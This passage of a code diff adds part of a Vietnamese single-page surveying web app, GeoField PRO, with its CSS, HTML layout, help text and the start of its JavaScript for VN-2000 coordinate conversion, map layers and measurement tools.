+.leaflet-marker-draggable:active{cursor:grabbing}
+
+/* ---- desktop ---- */
+@media (min-width:820px){
+  #panel{left:auto;right:12px;top:calc(var(--rbh) + 12px);bottom:12px;width:384px;max-height:none;
+         border:1px solid var(--line-2);border-radius:18px;border-top:1px solid var(--line-2);
+         transform:translateX(calc(100% + 26px))}
+  #panel.open{transform:translateX(0)}
+  #grip{height:52px;flex-basis:52px;justify-content:flex-start;padding:0 16px;border-bottom:1px solid rgba(255,255,255,.06)}
+  #grip::before{display:none}
+  #grip .lbl,#grip .count{margin-top:0}
+  #panelbody{padding:0 16px 24px}
+  #readout{bottom:16px!important}
+  #fabs{bottom:16px!important;right:calc(384px + 26px)}
+}
+
+/* ---- mobile compact toolbar ---- */
+.rb-mobile-actions{display:none}
+.rb-mact{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3px;
+  background:var(--card);border:1px solid var(--line-2);color:var(--ink);border-radius:13px;
+  padding:9px 4px;font-size:20px;line-height:1;cursor:pointer;font-family:var(--sans)}
+.rb-mact span{font-size:10px;font-weight:700;color:var(--muted);letter-spacing:.2px}
+.rb-mact:active{transform:scale(.94)}
+.rb-mact.on{background:linear-gradient(160deg,var(--pri-2),var(--pri));border-color:var(--pri);color:var(--pri-ink)}
+.rb-mact.on span{color:var(--pri-ink)}
+
+@media (max-width:819px){
+  .rb-tabs{height:34px;padding:0 8px;gap:2px}
+  .rb-brand{font-size:12px;margin-right:6px}
+  .rb-tabs .rb-tab.active{display:none}
+  .rb-tab{padding:7px 8px;font-size:11.5px}
+  .rb-body{flex-direction:column;overflow:visible;padding:6px 8px 7px;gap:7px;position:relative}
+  .rb-group{display:none}
+  #g-modes{display:block;border-right:0;min-width:0;padding:0}
+  #g-modes .rb-label{display:none}
+  #g-modes #modes{display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px}
+  #g-modes .rb-mbtn{justify-content:center;padding:12px 4px;font-size:13px}
+  .rb-mobile-actions{display:grid;grid-template-columns:repeat(5,1fr);gap:6px}
+  /* dropdown detail sheets */
+  #g-crs,#g-import,#g-export{
+    position:absolute;top:calc(100% + 4px);left:6px;right:6px;z-index:1300;
+    background:var(--panel-2);border:1px solid var(--line-2);border-radius:14px;
+    padding:14px;box-shadow:var(--shadow);flex-direction:column;gap:12px}
+  #g-crs .rb-label,#g-import .rb-label,#g-export .rb-label{display:block;order:-1;color:var(--pri);
+    font-size:11px;margin-bottom:2px}
+  .rb-body.show-crs #g-crs{display:flex}
+  .rb-body.show-import #g-import{display:flex}
+  .rb-body.show-export #g-export{display:flex}
+  #g-crs .rb-controls,#g-import .rb-controls,#g-export .rb-controls{
+    flex-direction:column;align-items:stretch;gap:12px}
+  #g-crs .rb-gear{display:none}
+  #g-crs .rb-field{gap:8px}
+  #g-crs .rb-field select{width:100%;min-width:0}
+  #g-crs .rb-degmin{justify-content:flex-start}
+  #g-crs .rb-degmin input{width:70px}
+  #g-import .rb-tool{width:100%;text-align:center;padding:13px;font-size:13px}
+  #g-import #import-stat{text-align:center}
+  #g-export .exp-rb{flex-direction:column;align-items:stretch;gap:12px}
+  #g-export .rb-run{width:100%;padding:14px;font-size:14px}
+  .rb-fmt{grid-template-columns:1fr 1fr;gap:9px}
+  .rb-fmt label{padding:8px 10px;background:var(--card);border:1px solid var(--line-2);border-radius:9px}
+  .rb-status{font-size:10px;padding:3px 10px 5px}
+  #fab-nav,#fab-loc{display:none}   /* now on the top action bar */
+}
+</style>
+</head>
+<body>
+
+<div id="map"></div>
+
+<!-- crosshair -->
+<div id="cross">
+  <svg width="46" height="46" viewBox="0 0 46 46">
+    <circle cx="23" cy="23" r="9" fill="none" stroke="var(--accent)" stroke-width="1.5"/>
+    <line x1="23" y1="0" x2="23" y2="15" stroke="var(--accent)" stroke-width="1.5"/>
+    <line x1="23" y1="31" x2="23" y2="46" stroke="var(--accent)" stroke-width="1.5"/>
+    <line x1="0" y1="23" x2="15" y2="23" stroke="var(--accent)" stroke-width="1.5"/>
+    <line x1="31" y1="23" x2="46" y2="23" stroke="var(--accent)" stroke-width="1.5"/>
+    <circle cx="23" cy="23" r="1.6" fill="var(--accent)"/>
+  </svg>
+</div>
+
+<div id="readout">
+  <div><span class="k">WGS84</span> <span id="ro-ll">—</span></div>
+  <div><span class="k">VN2000</span> <span class="en" id="ro-en">—</span></div>
+</div>
+
+<!-- ribbon toolbar -->
+<div id="ribbon">
+  <div class="rb-tabs">
+    <div class="rb-brand"><span class="rb-logo"></span>Geo<b>Field</b>&thinsp;PRO</div>
+    <div class="rb-tab active">Chuyển đổi VN-2000</div>
+    <div class="rb-tab" id="rb-tab-help">Hướng dẫn</div>
+    <div class="rb-tab" id="rb-tab-info">Thông tin</div>
+  </div>
+  <div class="rb-body">
+    <div class="rb-group" id="g-modes">
+      <div class="rb-controls" id="modes">
+        <button class="rb-mbtn on" data-mode="point"><span class="dot" style="background:var(--accent)"></span>Điểm</button>
+        <button class="rb-mbtn" data-mode="distance"><span class="dot" style="background:var(--cyan)"></span>Khoảng cách</button>
+        <button class="rb-mbtn" data-mode="area"><span class="dot" style="background:var(--violet)"></span>Diện tích</button>
+      </div>
+      <div class="rb-label">Chế độ làm việc</div>
+    </div>
+
+    <div class="rb-mobile-actions">
+      <button class="rb-mact" data-sheet="crs">⚙<span>Tọa độ</span></button>
+      <button class="rb-mact" data-sheet="import">⤒<span>Nhập</span></button>
+      <button class="rb-mact" data-sheet="export">⤓<span>Xuất</span></button>
+      <button class="rb-mact" id="mact-nav">🧭<span>Dẫn</span></button>
+      <button class="rb-mact" id="mact-loc">◎<span>Vị trí</span></button>
+    </div>
+
+    <div class="rb-group" id="g-crs">
+      <div class="rb-controls">
+        <span class="rb-gear" id="rb-gear" title="Tính chuyển tọa độ">⚙</span>
+        <div class="rb-field">
+          <select id="rb-sys"><option>Hệ tọa độ VN2000</option></select>
+          <div class="rb-degmin">
+            <input type="text" id="rb-deg" inputmode="numeric" value="105"><span class="u">°</span>
+            <input type="text" id="rb-min" inputmode="numeric" value="45"><span class="u">′</span>
+          </div>
+        </div>
+        <div class="rb-field">
+          <select id="rb-prov"></select>
+          <div class="rb-zone">
+            <label><input type="radio" name="zone" value="3" checked><span>3°</span></label>
+            <label><input type="radio" name="zone" value="6"><span>6°</span></label>
+          </div>
+        </div>
+      </div>
+      <div class="rb-label">Hệ tọa độ · Kinh tuyến trục</div>
+    </div>
+
+    <div class="rb-group" id="g-import">
+      <div class="rb-controls">
+        <button class="rb-tool" id="rb-import">⤒ Nhập KML/KMZ/DXF</button>
+        <button class="rb-tool" id="rb-fit" title="Phóng tới dữ liệu đã nhập">⤢ Vừa khung</button>
+        <button class="rb-tool" id="rb-import-clear" title="Xóa dữ liệu đã nhập">🗑 Xóa nhập</button>
+        <span id="import-stat" style="color:var(--green);font-size:11px;align-self:center;white-space:nowrap"></span>
+        <input type="file" id="import-file" accept=".kml,.kmz,.dxf" multiple style="display:none">
+      </div>
+      <div class="rb-label">Nhập dữ liệu ngoài</div>
+    </div>
+
+    <div class="rb-group" id="g-export">
+      <div class="rb-controls exp-rb">
+        <div class="rb-fmt">
+          <label><input type="radio" name="fmt" value="kml" checked><span>KML</span></label>
+          <label><input type="radio" name="fmt" value="dxf"><span>DXF (CAD)</span></label>
+          <label><input type="radio" name="fmt" value="xlsx"><span>Excel</span></label>
+          <label><input type="radio" name="fmt" value="png"><span>Ảnh PNG</span></label>
+          <label><input type="radio" name="fmt" value="gpx"><span>GPX</span></label>
+        </div>
+        <button class="rb-run" id="rb-export">⤓ Xuất</button>
+      </div>
+      <div class="rb-label">Định dạng &amp; xuất dữ liệu</div>
+    </div>
+
+    <div class="rb-group">
+      <div class="rb-controls">
+        <button class="rb-tool" id="rb-nav">🧭 Dẫn đường</button>
+        <button class="rb-tool" id="rb-loc">◎ Vị trí</button>
+      </div>
+      <div class="rb-label">Công cụ</div>
+    </div>
+  </div>
+  <div class="rb-status" id="rb-status"></div>
+  <div id="rb-info">
+    <b style="color:#eaf0f6">Tham số Hệ VN-2000</b><br>
+    Ellipsoid WGS-84 (a=6378137; 1/f=298,257223563). Phép chiếu Transverse Mercator, x₀=500000, y₀=0, lat₀=0.<br>
+    Biến đổi 7 tham số Bursa-Wolf sang WGS-84: ΔX=-191,90441; ΔY=-39,30318; ΔZ=-111,45033; k=+0,2529 ppm.<br>
+    KTT theo tỉnh: TT 24/2025/TT-BNNMT (34 tỉnh, từ 01/7/2025) và bảng 63 tỉnh (tham chiếu TT 25/2014/TT-BTNMT). Nên đối chiếu với hồ sơ dự án.<br><br><b style="color:#34d399">Tác giả: John</b>
+  </div>
+</div>
+
+<!-- FABs -->
+<div id="fabs">
+  <button class="fab" id="fab-nav" title="Dẫn đường la bàn">🧭</button>
+  <button class="fab" id="fab-loc" title="Vị trí của tôi">◎</button>
+  <button class="fab primary" id="fab-add" title="Thêm điểm tại tâm ngắm">＋</button>
+</div>
+
+<!-- panel -->
+<div id="panel">
+  <div id="grip">
+    <span class="lbl" id="grip-lbl">Bảng dữ liệu</span>
+    <span class="count" id="grip-count">0 điểm</span>
+  </div>
+  <div id="panelbody">
+
+    <div class="sec">
+      <h3>Đi tới tọa độ</h3>
+      <div class="row">
+        <div class="seg" id="gotoseg" style="flex:0 0 100%">
+          <button data-t="ll" class="on">Lat, Lon (WGS84)</button>
+          <button data-t="en">E, N (VN2000)</button>
+        </div>
+      </div>
+      <div class="row" style="margin-top:8px">
+        <input type="text" id="goto-in" placeholder="10.7769, 106.7009" style="flex:1 1 60%">
+        <button class="btn" id="goto-btn" style="flex:1 1 30%">Đi tới</button>
+      </div>
+    </div>
+
+    <div class="sec">
+      <h3>Tính chuyển giữa 2 kinh tuyến trục</h3>
+      <div class="row">
+        <label class="fld" style="flex:1 1 100%">KTT nguồn (độ · phút · múi)
+          <div class="row" style="gap:6px;flex-wrap:nowrap">
+            <input type="text" id="cv-deg" inputmode="numeric" value="105" style="flex:1">
+            <input type="text" id="cv-min" inputmode="numeric" value="45" style="flex:1">
+            <select id="cv-zone" style="flex:1.4"><option value="3">múi 3°</option><option value="6">múi 6°</option></select>
+          </div>
+        </label>
+      </div>
+      <div class="row" style="margin-top:8px">
+        <input type="text" id="cv-in" placeholder="E, N theo KTT nguồn — vd: 599242, 1188978" style="flex:1 1 58%">
+        <button class="btn" id="cv-btn" style="flex:1 1 32%">Chuyển →</button>
+      </div>
+      <div class="hint" id="cv-out">Kết quả hiển thị theo KTT đang dùng của app (xem thanh trạng thái phía trên) và WGS84.</div>
+      <div class="row" style="margin-top:8px"><button class="btn wide" id="cv-add" style="display:none">＋ Thêm thành điểm trên bản đồ</button></div>
+    </div>
+
+    <!-- POINT mode -->
+    <div class="sec modepane" data-pane="point">
+      <h3>Điểm đã chọn <span id="pt-n" style="color:var(--accent)"></span></h3>
+      <div class="list" id="pt-list"><div class="empty">Chạm vào bản đồ hoặc nhấn ＋ để thêm điểm.</div></div>
+      <div class="row" style="margin-top:10px">
+        <button class="btn ghost wide" id="pt-undo">↶ Bỏ điểm cuối</button>
+        <button class="btn danger wide" id="pt-clear">Xóa tất cả</button>
+      </div>
+    </div>
+
+    <!-- DISTANCE mode -->
+    <div class="sec modepane" data-pane="distance" style="display:none">
+      <h3>Đo khoảng cách</h3>
+      <div class="result">
+        <div class="stat dist"><div class="v" id="d-total">0</div><div class="u">Tổng chiều dài (m) · lưới VN2000</div></div>
+        <div class="stat"><div class="v" id="d-seg">0</div><div class="u">Đoạn cuối (m)</div></div>
+      </div>
+      <div class="pickrow" id="d-pick" style="display:none"><span class="picklab">Chèn điểm đã đánh dấu (theo thứ tự chạm):</span><div class="chips" id="d-chips"></div></div>
+      <div class="list" id="d-list" style="margin-top:10px"><div class="empty">Chạm bản đồ, chạm vào điểm đã đánh dấu, hoặc dùng nút bên trên để đặt các đỉnh của tuyến đo.</div></div>
+      <div class="row" style="margin-top:10px">
+        <button class="btn ghost wide" id="d-undo">↶ Bỏ đỉnh cuối</button>
+        <button class="btn danger wide" id="d-clear">Xóa tuyến</button>
+      </div>
+    </div>
+
+    <!-- AREA mode -->
+    <div class="sec modepane" data-pane="area" style="display:none">
+      <h3>Đo diện tích</h3>
+      <div class="result">
+        <div class="stat area"><div class="v" id="a-area">0</div><div class="u" id="a-unit">m²</div></div>
+        <div class="stat"><div class="v" id="a-peri">0</div><div class="u">Chu vi (m)</div></div>
+      </div>
+      <div class="pickrow" id="a-pick" style="display:none;margin-top:10px"><span class="picklab">Chèn điểm đã đánh dấu:</span><div class="chips" id="a-chips"></div></div>
+      <div class="hint" id="a-extra"></div>
+      <div class="row" style="margin-top:10px">
+        <button class="btn ghost wide" id="a-undo">↶ Bỏ đỉnh cuối</button>
+        <button class="btn danger wide" id="a-clear">Xóa vùng</button>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- navigation / compass floating widget -->
+<div id="navWidget">
+  <div class="nw-head" id="nw-head">
+    <span class="nw-grip">⠿</span>
+    <span class="nw-title" id="nw-title">🧭 Dẫn đường</span>
+    <div class="gpschip" id="nav-gps"><span class="led"></span><span id="nav-gps-txt">GPS…</span></div>
+    <button class="nw-btn" id="nav-settings" title="Đích & chênh cao">⚙</button>
+    <button class="nw-btn" id="nav-close" title="Đóng">✕</button>
+  </div>
+
+  <div class="nw-body">
+    <div class="nw-compass">
+      <svg viewBox="0 0 300 300" xmlns="http://www.w3.org/2000/svg">
+        <defs>
+          <linearGradient id="arrGrad" x1="0" y1="0" x2="0" y2="1">
+            <stop offset="0" stop-color="#ffb020"/><stop offset="1" stop-color="#ff4d2e"/>
+          </linearGradient>
+          <radialGradient id="hubGrad" cx="40%" cy="35%" r="75%">
+            <stop offset="0" stop-color="#ffffff"/><stop offset="0.6" stop-color="#e2e8ee"/><stop offset="1" stop-color="#aeb8c2"/>
+          </radialGradient>
+        </defs>
+        <circle cx="150" cy="150" r="146" fill="#0b1117" stroke="#2a3746" stroke-width="2"/>
+        <g id="navRing"></g>
+        <g id="navArrow"><polygon points="150,36 178,98 159,98 159,150 141,150 141,98 122,98" fill="url(#arrGrad)"/></g>
+        <circle cx="150" cy="150" r="46" fill="url(#hubGrad)" stroke="#c9d2db" stroke-width="2"/>
+        <text id="navDist" x="150" y="147" text-anchor="middle" fill="#12181f" font-size="26" font-weight="800" font-family="var(--sans)">—</text>
+        <text id="navUnit" x="150" y="171" text-anchor="middle" fill="#41525f" font-size="14" font-weight="700" font-family="var(--sans)">m</text>
+      </svg>
+    </div>
+    <div class="nw-side">
+      <div class="bearing-line" id="nav-bearing">Chọn điểm đích…</div>
+      <div class="nw-mini"><span class="lab">TỌA ĐỘ ĐỨNG (N : E)</span><span class="val" id="nav-cur">—</span></div>
+      <div class="nw-mini"><span class="lab">ĐIỂM ĐÍCH (N : E)</span><span class="val" id="nav-tgt">—</span></div>
+      <div class="nw-mini"><span class="lab">CHÊNH CAO</span><span class="val" id="nav-dh">ΔH —</span></div>
+      <div class="nw-mini"><span class="lab">ĐỘ CHÍNH XÁC</span><span class="val" id="nav-acc">± — m</span></div>
+    </div>
+  </div>
+
+  <div class="nw-settings" id="nav-drawer" style="display:none">
+    <label class="fld">Điểm đích
+      <select id="nav-target"></select>
+    </label>
+    <label class="fld">Hoặc nhập E, N (VN2000)
+      <div class="row"><input type="text" id="nav-target-en" placeholder="599242, 1188978" style="flex:1"><button class="btn" id="nav-set-en" style="flex:0 0 auto">Đặt</button></div>
+    </label>
+    <div class="row">
+      <label class="fld">Cao độ đứng (m)
+        <div class="row"><input type="text" id="nav-z-stand" placeholder="0.000" inputmode="decimal" style="flex:1"><button class="btn" id="nav-z-gps" title="Lấy từ GPS" style="flex:0 0 auto">GPS</button></div>
+      </label>
+      <label class="fld">Cao độ đích (m)
+        <input type="text" id="nav-z-target" placeholder="0.000" inputmode="decimal">
+      </label>
+    </div>
+    <div class="dh-note" id="nav-dh-note">Chênh cao = cao độ đích − cao độ đứng.</div>
+  </div>
+</div>
+
+<!-- help modal -->
+<div id="helpModal">
+  <div class="hm-card">
+    <div class="hm-head"><b>📖 Hướng dẫn sử dụng GeoField PRO</b><button class="nw-btn" id="help-close">✕</button></div>
+    <div class="hm-body">
+      <h4>1 · Nền bản đồ & hệ tọa độ</h4>
+      Nút lớp <span class="tag">⧉</span> góc trên-trái bản đồ: chọn 9 nền (Esri, Google, OSM…). Trên thanh công cụ: chọn <b>tỉnh/thành</b> hoặc nhập <b>KTT °/′</b> + múi <b>3°/6°</b> — mọi bảng và file xuất đều theo KTT này (xem thanh trạng thái).
+      <h4>2 · Điểm đánh dấu</h4>
+      Chế độ <b>Điểm</b>: chạm bản đồ hoặc nhấn <span class="tag">＋</span> thêm tại tâm ngắm. Nhấn <span class="tag">✎</span> (hoặc chạm điểm trên bản đồ) để đặt <b>tên</b> và <b>cao độ h</b>. Mục <b>Đi tới tọa độ</b>: nhập Lat,Lon hoặc E,N để bay tới &amp; tạo điểm.
+      <h4>3 · Khoảng cách & diện tích (hiện ngay trên bản đồ)</h4>
+      Chuyển chế độ <b>Khoảng cách</b> / <b>Diện tích</b> rồi <b>chạm thẳng lên bản đồ</b> để đặt các đỉnh (hoặc chạm điểm đã đánh dấu, bấm chip <span class="tag">P1</span> <span class="tag">P2</span>…). Kết quả <b>hiển thị trực tiếp trên bản đồ</b>: chiều dài từng đoạn, tổng chiều dài <b>Σ</b>, và diện tích + chu vi ở giữa vùng — cập nhật tức thời. Có thể <b>kéo-thả từng đỉnh</b> (chấm tròn) để chỉnh, số đo tự tính lại. Mọi giá trị theo <b>lưới VN-2000</b>. <span class="tag">↶</span> bỏ đỉnh cuối nếu chọn nhầm.
+      <h4>4 · Dẫn đường la bàn 🧭</h4>
+      Nhấn <b>Dẫn đường</b> → ⚙ chọn <b>điểm đích</b> (hoặc nhập E,N). Kim đỏ chỉ hướng cần đi, giữa la bàn là khoảng cách còn lại; hiển thị tọa độ đứng / đích (N : E) và <b>± độ chính xác GPS</b>. Nhập <b>cao độ đứng</b> và <b>cao độ đích</b> (thủ công) để ra <b>chênh cao ΔH</b>. Cửa sổ nhỏ, kéo-thả được — bản đồ vẫn hiện vệt đỏ tới đích.
+      <h4>5 · Tính chuyển giữa 2 KTT</h4>
+      Trong bảng dữ liệu: nhập E,N theo <b>KTT nguồn</b> (°/′/múi) → nhận E,N theo KTT đang dùng + WGS84; có thể thêm ngay thành điểm.
+      <h4>6 · Nhập dữ liệu ngoài (KML / KMZ / DXF)</h4>
+      Nhấn <b>⤒ Nhập KML/KMZ/DXF</b> để nạp dữ liệu từ Google Earth hoặc CAD (chọn nhiều tệp cùng lúc). Điểm, đường, vùng nhập vào hiện <b>màu xanh lá</b> trên bản đồ kèm nhãn chiều dài/diện tích. <b>⤢ Vừa khung</b> phóng tới dữ liệu, <b>🗑 Xóa nhập</b> để bỏ.<br>
+      <span style="color:var(--accent)">Lưu ý với DXF (CAD):</span> tọa độ DXF được đọc là <b>E,N theo đúng KTT/múi đang chọn</b> — hãy đặt KTT khớp với bản vẽ <i>trước khi</i> nhập, nếu không đối tượng sẽ lệch vị trí. (DWG cần xuất sang DXF trước; KMZ tự giải nén.)
+      <h4>7 · Xuất file</h4>
+      Chọn định dạng rồi nhấn <b>Xuất</b>: <b>KML / GPX</b> (WGS84 — Google Earth, máy GPS), <b>DXF</b> (CAD — tọa độ VN-2000, z = cao độ h), <b>Excel</b> (bảng điểm + đo đạc), <b>Ảnh PNG</b> (kèm tên điểm, chiều dài đoạn, diện tích, khung KTT, thước tỷ lệ, hướng Bắc).
+      <h4>8 · Mở trên điện thoại</h4>
+      <b>Android:</b> mở file .html bằng <b>Chrome</b> (Files/Zalo → Mở bằng → Chrome).<br>
+      <b>iPhone:</b> tải một ứng dụng <b>HTML Viewer</b> trên App Store (tìm từ khóa “HTML Viewer”), rồi <b>mở file .html bằng ứng dụng này</b>: chép/chia sẻ file .html vào ứng dụng HTML Viewer → chạm để mở. App chạy đầy đủ ngay trong ứng dụng xem HTML.<br>
+      <span style="color:var(--muted)">La bàn iOS chỉ xoay theo máy khi chạy qua https; nếu không, kim vẫn chỉ đúng hướng tính theo Bắc thực.</span>
+      <h4>9 · Dữ liệu</h4>
+      Điểm, tuyến, vùng, dữ liệu đã nhập, KTT, khung nhìn <b>tự lưu trên máy</b> — mở lại không mất. «Xóa tất cả» để làm mới.
+      <h4>10 · Kích hoạt bản quyền</h4>
+      Lần đầu mở, app hiện màn hình <b>kích hoạt</b>. Bấm <b>Sao chép Mã máy</b> rồi gửi cho <b>tác giả (John)</b> (kèm tên đơn vị) để nhận <b>mã kích hoạt</b>. Dán mã vào ô → <b>Kích hoạt</b>. Có thể xin <b>mã dùng thử 30 ngày</b> trước, sau đó gia hạn bằng <b>mã bản quyền theo năm</b>. Mã chỉ chạy đúng thiết bị này và <b>có hạn dùng</b>; hết hạn app khóa hẳn, cần xin mã gia hạn (cùng Mã máy). Đổi máy hoặc xóa sạch dữ liệu trình duyệt có thể phải xin mã mới.
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+/* ============================================================
+   Coordinate system (VN-2000, 7-param Bursa-Wolf to WGS84)
+   ============================================================ */
+const WGS84 = "+proj=longlat +datum=WGS84 +no_defs";
+const TOWGS84 = "-191.90441429,-39.30318279,-111.45032835,-0.00928836,0.01975479,-0.00427372,0.252906278";
+function vnDef(lon0,k){
+  return `+proj=tmerc +lat_0=0 +lon_0=${lon0} +k=${k} +x_0=500000 +y_0=0 +ellps=WGS84 +towgs84=${TOWGS84} +units=m +no_defs`;
+}
+const state = { lon0:105.75, k:0.9999, width:3 };
+function vnProj(){ return vnDef(state.lon0, state.k); }
+function toEN(lat,lng){ const p=proj4(WGS84, vnProj(), [lng,lat]); return {e:p[0], n:p[1]}; }
+function toLL(e,n){ const p=proj4(vnProj(), WGS84, [e,n]); return {lng:p[0], lat:p[1]}; }
+
+/* Kinh tuyến trục theo tỉnh. [tên, độ, phút].
+   P34: Thông tư 24/2025/TT-BNNMT (34 tỉnh, áp dụng 01/7/2025).
+   P63: bảng 63 tỉnh trước sáp nhập (tham chiếu TT 25/2014/TT-BTNMT). */
+const P34 = [
+  ["An Giang",104,45],["Bắc Ninh",107,0],["Cà Mau",104,30],["Cao Bằng",105,45],
+  ["Đắk Lắk",108,30],["Điện Biên",103,0],["Đồng Nai",107,45],["Đồng Tháp",105,0],
+  ["Gia Lai",108,15],["Hà Tĩnh",105,30],["Hưng Yên",105,30],["Khánh Hòa",108,15],
+  ["Lai Châu",104,45],["Lạng Sơn",107,15],["Lào Cai",104,45],["Lâm Đồng",107,45],
+  ["Nghệ An",104,45],["Ninh Bình",105,0],["Phú Thọ",104,45],["Quảng Ngãi",108,0],
+  ["Quảng Ninh",107,45],["Quảng Trị",106,0],["Sơn La",104,0],["Tây Ninh",105,45],
+  ["Thái Nguyên",106,30],["Thanh Hóa",105,0],["TP. Cần Thơ",105,0],["TP. Đà Nẵng",107,45],
+  ["TP. Hà Nội",105,0],["TP. Hải Phòng",105,45],["TP. Hồ Chí Minh",105,45],["TP. Huế",107,0],
+  ["Tuyên Quang",106,0],["Vĩnh Long",105,30]
+];
+const P63 = [
+  ["Lai Châu",103,0],["Điện Biên",103,0],["Sơn La",104,0],["Lào Cai",104,45],["Yên Bái",104,45],
+  ["Hà Giang",105,30],["Tuyên Quang",106,0],["Phú Thọ",104,45],["Vĩnh Phúc",105,0],["Cao Bằng",105,45],
+  ["Lạng Sơn",107,15],["Bắc Kạn",106,30],["Thái Nguyên",106,30],["Bắc Giang",107,0],["Bắc Ninh",105,30],
+  ["Quảng Ninh",107,45],["TP. Hải Phòng",105,45],["Hải Dương",105,30],["Hưng Yên",105,30],["TP. Hà Nội",105,0],
+  ["Hòa Bình",106,0],["Hà Nam",105,0],["Nam Định",105,30],["Thái Bình",105,30],["Ninh Bình",105,0],
+  ["Thanh Hóa",105,0],["Nghệ An",104,45],["Hà Tĩnh",105,30],["Quảng Bình",106,0],["Quảng Trị",106,15],
+  ["Thừa Thiên – Huế",107,0],["TP. Đà Nẵng",107,45],["Quảng Nam",107,45],["Quảng Ngãi",108,0],["Bình Định",108,15],
+  ["Kon Tum",107,30],["Gia Lai",108,30],["Đắk Lắk",108,30],["Đắk Nông",108,30],["Phú Yên",108,30],
+  ["Khánh Hòa",108,15],["Ninh Thuận",108,15],["Bình Thuận",108,30],["Lâm Đồng",107,45],["Bình Dương",105,45],
+  ["Bình Phước",106,15],["Đồng Nai",107,45],["Bà Rịa – Vũng Tàu",107,45],["Tây Ninh",105,30],["Long An",105,45],
+  ["Tiền Giang",105,45],["Bến Tre",105,45],["Đồng Tháp",105,0],["Vĩnh Long",105,30],["Trà Vinh",105,30],
+  ["An Giang",104,45],["Kiên Giang",104,30],["TP. Cần Thơ",105,0],["Hậu Giang",105,0],["Sóc Trăng",105,30],
+  ["Bạc Liêu",105,0],["Cà Mau",104,30],["TP. Hồ Chí Minh",105,45]
+];
+
+/* ============================================================
+   Map + base layers
+   ============================================================ */
+const map = L.map('map',{zoomControl:true, attributionControl:true}).setView([10.7769,106.7009],13);
+L.control.zoom({position:'topleft'}); // default already top-left
+
+const esriImg = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}',
+  {maxZoom:19, crossOrigin:true, attribution:'Esri, Maxar, Earthstar Geographics'});
+const esriTopo = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Topo_Map/MapServer/tile/{z}/{y}/{x}',
+  {maxZoom:19, crossOrigin:true, attribution:'Esri'});
+const esriStreet = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Street_Map/MapServer/tile/{z}/{y}/{x}',
+  {maxZoom:19, crossOrigin:true, attribution:'Esri'});
+const osm = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',
+  {maxZoom:19, crossOrigin:true, attribution:'© OpenStreetMap'});
+const carto = L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png',
+  {maxZoom:20, crossOrigin:true, attribution:'© OpenStreetMap © CARTO'});
+const topoOpen = L.tileLayer('https://{s}.tile.opentopomap.org/{z}/{x}/{y}.png',
+  {maxZoom:17, crossOrigin:true, attribution:'© OpenTopoMap (CC-BY-SA)'});
+const gSat = L.tileLayer('https://mt{s}.google.com/vt/lyrs=s&x={x}&y={y}&z={z}',
+  {maxZoom:21, subdomains:'0123', attribution:'© Google'});
+const gHyb = L.tileLayer('https://mt{s}.google.com/vt/lyrs=y&x={x}&y={y}&z={z}',
+  {maxZoom:21, subdomains:'0123', attribution:'© Google'});
+const gRoad = L.tileLayer('https://mt{s}.google.com/vt/lyrs=m&x={x}&y={y}&z={z}',
+  {maxZoom:21, subdomains:'0123', attribution:'© Google'});
+
+esriImg.addTo(map);
+let currentBase = esriImg;
+const baseLayers = {
+  "Ảnh vệ tinh (Esri)":esriImg,
+  "Địa hình (Esri)":esriTopo,
+  "Đường phố (Esri)":esriStreet,
+  "OpenStreetMap":osm,
+  "Nền tối (Carto)":carto,
+  "Địa hình mở (OpenTopo)":topoOpen,
+  "Vệ tinh (Google)":gSat,
+  "Vệ tinh + nhãn (Google)":gHyb,
+  "Đường phố (Google)":gRoad
+};
+L.control.layers(baseLayers,null,{position:'topleft',collapsed:true}).addTo(map);
+map.on('baselayerchange', e=> currentBase = e.layer);
+
+/* label overlay for hybrid feel on imagery */
+const labels = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/Reference/World_Boundaries_and_Places/MapServer/tile/{z}/{y}/{x}',
+  {maxZoom:19, crossOrigin:true});
+labels.addTo(map);
+map.on('baselayerchange', e=>{ if(e.layer===esriImg){ labels.addTo(map);} else { map.removeLayer(labels);} });
+
+/* ============================================================
+   Data
+   ============================================================ */
+let mode = 'point';
+const data = { point:[], distance:[], area:[] };
+let imported = [];   // {kind:'point'|'line'|'polygon', name, pts:[{lat,lng}], src}
+const gPoint = L.layerGroup().addTo(map);
+const gDist  = L.layerGroup().addTo(map);   // distance vertices (draggable)
+const gDistOv= L.layerGroup().addTo(map);   // distance line + labels
+const gArea  = L.layerGroup().addTo(map);   // area vertices (draggable)
+const gAreaOv= L.layerGroup().addTo(map);   // area polygon + labels
+const gImport= L.layerGroup().addTo(map);
+const gNav   = L.layerGroup().addTo(map);
+const COL = {point:'#ffb020', distance:'#38c0c9', area:'#b58cff', import:'#34d399'};
+
+/* draggable vertex handle (divIcon marker) */
+function vtxIcon(color){ return L.divIcon({className:'vtx-handle', iconSize:[16,16], iconAnchor:[8,8],
+  html:`<div class="vh" style="background:${color}"></div>`}); }
+function makeVertex(arr,i,color,group,onchange){
+  const p=arr[i];
+  const mk=L.marker([p.lat,p.lng],{icon:vtxIcon(color),draggable:true,keyboard:false,zIndexOffset:500}).addTo(group);
+  mk.on('click',ev=>L.DomEvent.stopPropagation(ev));
+  mk.on('drag',ev=>{ const ll=ev.target.getLatLng(); arr[i].lat=ll.lat; arr[i].lng=ll.lng; if(onchange) onchange(true); });
+  mk.on('dragend',()=>{ if(onchange) onchange(false); });
+  return mk;
+}
+/* mid-point of a segment in grid space, returned as latlng for label placement */
+function midLL(a,b){ return [ (a.lat+b.lat)/2, (a.lng+b.lng)/2 ]; }
+function fmtLen(m){ return m>=1000? (m/1000).toFixed(3)+' km' : m.toFixed(2)+' m'; }
+function fmtArea(a){ if(a>=1e6) return (a/1e6).toFixed(4)+' km²'; if(a>=1e4) return (a/1e4).toFixed(4)+' ha'; return a.toFixed(2)+' m²'; }
+function labelAt(latlng,text,cls,group){
+  return L.marker(latlng,{icon:L.divIcon({className:'mlabel '+cls,html:text,iconSize:null}),interactive:false,keyboard:false}).addTo(group);
